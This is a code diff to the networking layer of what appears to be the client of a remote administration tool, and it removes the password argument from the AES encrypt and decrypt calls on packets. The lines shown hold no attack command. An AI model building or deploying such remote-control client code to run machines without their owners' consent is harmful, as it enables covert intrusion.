@@ -454,7 +454,7 @@ namespace xClient.Core.Networking
                                 if (_writeOffset == _payloadLen)
                                 {
                                     if (encryptionEnabled)
-                                        _payloadBuffer = AES.Decrypt(_payloadBuffer, Encoding.UTF8.GetBytes(Settings.PASSWORD));
+                                        _payloadBuffer = AES.Decrypt(_payloadBuffer);
 
                                     if (_payloadBuffer.Length > 0)
                                     {
@@ -574,7 +574,7 @@ namespace xClient.Core.Networking
                     payload = new SafeQuickLZ().Compress(payload, 0, payload.Length, 3);
 
                 if (encryptionEnabled)
-                    payload = AES.Encrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));
+                    payload = AES.Encrypt(payload);
 
                 byte[] header = new byte[]
                 {
